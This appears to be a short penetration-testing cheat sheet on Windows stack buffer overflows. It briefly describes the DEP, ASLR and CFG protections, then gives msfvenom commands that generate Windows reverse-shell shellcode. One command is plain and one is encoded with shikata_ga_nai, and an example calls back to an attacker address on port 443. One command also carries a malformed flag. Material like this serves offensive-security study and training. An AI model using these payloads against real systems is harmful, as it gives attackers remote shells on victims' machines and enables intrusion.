
## Windows Buffer Overflows
> Tips & Tricks for exploiting a stack based buffer overflow on targets running Windows

#### Buffer Overflow Protection Mechanisms on Windows
- DEP -> Data Execution Protection
	- hardware/software that perform extra memory access checks to make sure code is not execution from data pages
- ASLR -> Address Space Layout Randomization
	- randomizes the base address of a program and it's DLL's every time it is loaded so that exploitation of a statis memory address is not feasible
	- This is not implemented on WinXP
- CFG -> Control-Flow Guard 
	- prevents code from branching and overwriting memory address pointers

### MSFVenom Shellcode Payloads
- standard shellcode payload -> rev shell: 
	- ```msfvenom -p windows/shell_reverse_tcp LHOST=[my ip] LPORT=443 -f -c```
- Shikata Ga Nai encoded payload to prevent bad characters from stopping overwrite: 
	- ```msfvenom -p windows/shell_reverse_tcp LHOST=[my ip] LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\list\of\bad\chars\hex"```
		- Example: 
			- ```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 EXITFUNC=thread LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"```